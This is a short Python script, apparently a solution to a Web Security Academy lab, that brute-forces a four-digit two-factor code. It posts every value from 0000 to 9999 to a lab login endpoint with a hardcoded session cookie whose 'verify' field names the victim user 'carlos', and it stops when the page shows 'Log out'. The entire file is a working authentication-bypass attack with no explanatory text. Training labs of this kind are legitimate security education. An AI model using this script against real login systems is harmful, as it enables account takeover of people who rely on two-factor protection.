import sys
import urllib3
import urllib
import requests
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080' , 'https': 'https://127.0.0.1:8080'}

def init_request(url, cookie, n):
    if n < 10:
        data = {'mfa-code': '000%s' % n}
    elif n < 100:
        data = {'mfa-code': '00%s' % n}
    elif n < 1000:
        data = {'mfa-code': '0%s' % n}
    else: 
        data = {'mfa-code': '%s' % n}
    return requests.post(url = url, cookies = cookie, data = data) 

def send_request(url):
    cookie = {'verify': 'carlos', 'session': 'KdZob1w7OAqqlqk1yqODDGWA9ZG5sxgr'}
    for i in range(10000):
        sys.stdout.write('\r' + str(i))
        sys.stdout.flush()
        r = init_request(url, cookie, i)
        if ('Log out' in r.text):
            print('Successfully !!!')
            break

def main():
    url = 'https://0ac400f9045a1645c2fecc8800610006.web-security-academy.net/login2'
    print('(+) Retrieving security code:')
    send_request(url)
    
    

if __name__ == '__main__':
    main()